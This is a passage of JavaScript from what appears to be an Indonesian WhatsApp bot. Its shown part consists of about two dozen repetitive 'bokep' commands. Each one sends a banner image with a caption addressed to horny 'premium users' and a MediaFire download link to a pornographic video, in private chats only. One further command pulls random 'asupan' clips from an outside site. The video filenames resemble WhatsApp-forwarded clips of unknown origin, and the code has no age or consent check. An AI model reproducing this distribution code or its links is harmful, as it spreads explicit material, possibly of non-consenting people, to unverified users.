	if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/h2nygxbyb6n9cyo/VID-20210107-WA1468.mp4/file' })
		break
		
		case 'asupantiktok': case 'ptl': case 'ptlvid':{
                if ( !isOwner && !mek.key.fromMe) return sendButMessage (from, prem1, prem2, prem3, { quoted: fniv})
               reply(mess.wait)
                 fetchText('http://sansekai.my.id/sansekai.txt').then(async data => {
                    var wifegerak = data.split('\n')
                    var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
        sendGif(await getBuffer('http://sansekai.my.id/ptl_repost/' + wifegerakx), 'Follow IG: https://www.instagram.com/ptl_repost untuk mendapatkan asupan lebih banyak.')
                })
                }
                break
  //=========================================================
  case 'bokep2':
  if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
		 
		qute = fs.readFileSync('media/image/banner.jpg') 
		mek.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/pk8hozohzdc076c/VID-20210107-WA1466.mp4/file' })
		break 
  //=========================================================
  case 'bokep3':
	if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/112q3u286tnvzjo/VID-20210107-WA1467.3gp/file' })				    
		break 
  //========================================================= 
  case 'bokep4':	
  if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/arpphhxsv94ak0r/VID-20210107-WA1462.mp4/file' })				   
		break
  //=========================================================
  case 'bokep5':
	if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/us3f4j62emftbrf/VID-20210107-WA1463.mp4/file' })				   
		break
  //=========================================================
  case 'bokep6':	
  if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊??𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/v4033tkl16hgf2b/VID-20210107-WA1459.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep7':
  if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
		 
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/3scnim6d1x4b8ie/VID-20210107-WA1461.mp4/file' })				   
		break
  //=========================================================
  case 'bokep8':
	if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/dx9tklonu0eq36w/VID-20210107-WA1464.mp4/file' })				   
		break
  //=========================================================
  case 'bokep10':	
  if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
   
  qute = fs.readFileSync('media/image/banner.jpg') 
	 wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/snwja297dv4zvtl/VID-20210107-WA0036.mp4/file' })				   
	 break
  //=========================================================
  case 'bokep11':
  if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
		 	
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/60dqek0mqhyt6rn/VID-20210107-WA1530.mp4/file' })				   
		break
  //=========================================================
  case 'bokep12':
  if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
		 				    
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/ni2mcdknb6zn50t/VID-20210107-WA1532.mp4/file' })				   
		break
  //=========================================================
  case 'bokep13':	
  if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/i9t96lrmd9lm71z/VID-20210107-WA1542.mp4/file' })				   
		break
  //=========================================================
  case 'bokep14':	
  if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/tjqdfmp8g08dt4e/VID-20210107-WA1536.mp4/file' })				   
		break
  //=========================================================
  case 'bokep15':
  if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
		 
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/x034q0s16u9vyhy/VID-20210107-WA1537.mp4/file' })				   
		break
  //=========================================================
  case 'bokep16':
  if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
		 
		 qute = fs.readFileSync('media/image/banner.jpg') 
		 wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/mgmynqghjnon2q7/VID-20210107-WA1533.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep17':
  if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
		 	
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/ecly00at6adxs20/VID-20210107-WA1540.mp4/file' })				   
		break
  //=========================================================
  case 'bokep18':
  if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
		 
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/7qkn8nuog22jsco/VID-20210107-WA1534.mp4/file' })				   
		break
  //=========================================================
  case 'bokep19':	
  if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 ??𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
   			 				
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/vza5uaben93dfdr/VID-20210107-WA1527.mp4/file' })				   
		break
  //=========================================================
  case 'bokep20':	
	if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 ??𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
   	
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/l7uzd4v9p95wpeb/VID-20210107-WA1541.mp4/file' })				   
		break
  //=========================================================
  case 'bokep21':	
  if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀??𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
   			 				
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/icpnxsr18j6l2pp/VID-20210107-WA1528.mp4/file' })				   
		break
  //=========================================================
  case 'bokep22':	
  if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀??𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
   	
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/cscj9taoq5s5oj9/VID-20210107-WA1538.mp4/file' })				   
		break
  //=========================================================
  case 'bokep23':
	if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/saer161lthn4sy3/VID-20210107-WA1525.mp4/file' })				   
		break
  //=========================================================
  case 'bokep24':	
			 if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \\nhttps://www.mediafire.com/file/9jy3nj2b2ljjzxb/VID-20210107-WA1539.mp4/file' })				   
		 break
   //===========================================================  
   //=====================================================================================================================================================================================
  case 'bokep25':	
			 if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/w3xd3btju78s9ag/1_5012836500744700312.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep26':
				 if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
   
		qute = fs.readFileSync('media/image/banner.jpg') 
